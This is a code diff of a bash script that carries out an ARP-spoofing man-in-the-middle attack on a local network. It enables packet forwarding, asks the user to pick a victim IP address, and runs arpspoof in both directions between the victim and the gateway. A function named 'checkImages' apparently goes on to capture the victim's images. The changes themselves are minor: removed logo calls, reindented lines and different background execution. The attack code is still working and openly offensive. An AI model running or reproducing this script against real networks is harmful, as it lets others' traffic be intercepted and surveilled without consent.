@@ -2,13 +2,11 @@
 
 function enablePacketFowarding {
   defaultInterface=$(sysctl -w net.ipv4.ip_forward=1)
-  headerLogo
   printf "\n Packet Forwarding Enabled \n\n";
 }
 
 function disablePacketFowarding {
   defaultInterface=$(sysctl -w net.ipv4.ip_forward=0)
-  headerLogo
   print "\n Packet Forwarding Disabled \n\n";
 }
 
@@ -33,12 +31,12 @@ function printIPAddressesInNetworkMIM {
 
 function selectedTarget {
 
-    printf "${YELLOW}Available devices: \n${WHITE}"
-    printIPAddressesInNetworkMIM
+  printf "${YELLOW}Available devices: \n${WHITE}"
+  printIPAddressesInNetworkMIM
 
 
-    printf "\n SELECT TARGET IP> \n"
-    read -r victimIPAddress
+  printf "\n SELECT TARGET IP> \n"
+  read -r victimIPAddress
 
   getDefaultGateway
   trafficSelectedIp
@@ -64,16 +62,16 @@ function trafficSelectedIp {
 }
 
 function interceptPackages {
-  printf "Intercepting pacakages\n\n"
+  printf " Intercepting pacakages\n\n"
   cmd="arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway
 
-  eval "${cmd}" &>/dev/null &disown
+  $cmd &
 }
 
 function inverseInterceptPackages {
   cmd2="arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress
 
-  eval "${cmd2}" &>/dev/null &disown
+  $cmd2 &
 }
 
 function checkImages {
